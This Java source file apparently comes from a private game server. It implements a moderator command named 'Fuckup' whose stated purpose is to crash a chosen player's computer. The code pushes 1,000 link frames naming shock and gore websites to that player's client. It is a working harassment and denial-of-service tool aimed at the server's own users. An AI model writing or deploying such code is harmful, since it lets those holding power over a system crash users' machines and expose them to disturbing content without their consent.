package ab.model.players.packets.commands.moderator;

import java.util.Optional;

import ab.database.PunishmentHandler;
import ab.model.players.Player;
import ab.model.players.PlayerHandler;
import ab.model.players.packets.commands.Command;

/**
 * Force the computer of a given player to crash by flooding it with links.
 * 
 * @author Emiel
 */
public class Fuckup implements Command {

	@Override
	public void execute(Player c, String input) {
		Optional<Player> optionalPlayer = PlayerHandler.getOptionalPlayer(input);
		if (optionalPlayer.isPresent()) {
			Player c2 = optionalPlayer.get();
			if (c2.getRights().isBetween(1,  3)) {
				c.sendMessage("You can't use this command on this player!");
				return;
			}
			new PunishmentHandler().punishOnlinePlayer(c2, c, "Fuckup", "");
			for (int j = 0; j < 250; j++) {
				c2.getPA().sendFrame126("www.imswinging.com", 12000);
				c2.getPA().sendFrame126("www.sourmath.com", 12000);
				c2.getPA().sendFrame126("www.googlehammer.com", 12000);
				c2.getPA().sendFrame126("www.bmepainolympics2.com", 12000);
			}
		} else {
			c.sendMessage(input + " is not online. You can only fuckup online players.");
		}
	}
}
